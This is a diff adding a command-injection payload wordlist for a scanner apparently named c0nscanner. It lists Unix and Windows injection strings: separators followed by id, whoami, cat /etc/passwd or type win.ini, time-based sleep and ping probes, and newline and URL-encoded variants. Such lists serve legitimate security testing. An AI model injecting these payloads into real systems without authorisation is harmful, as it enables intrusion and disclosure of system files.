@@ -1,0 +1,55 @@
+# command injection payloads - c0nscanner
+# basic command injection
+; id
+; whoami
+; uname -a
+; cat /etc/passwd
+| id
+| whoami
+| uname -a
+|| id
+|| whoami
+& id
+& whoami
+&& id
+&& whoami
+`id`
+`whoami`
+$(id)
+$(whoami)
+; ls -la
+| ls -la
+# time-based blind
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+; sleep 5 #
+| sleep 5 #
+# windows commands
+& timeout /t 5
+| timeout /t 5
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& dir
+| dir
+& whoami
+| type C:\windows\win.ini
+# newline injection
+%0aid
+%0awhoami
+%0asleep 5
+%0d%0aid
+%0d%0awhoami
+# encoded
+;+id
+|+id
+%3Bid
+%7Cid
+%26id
+%26%26id
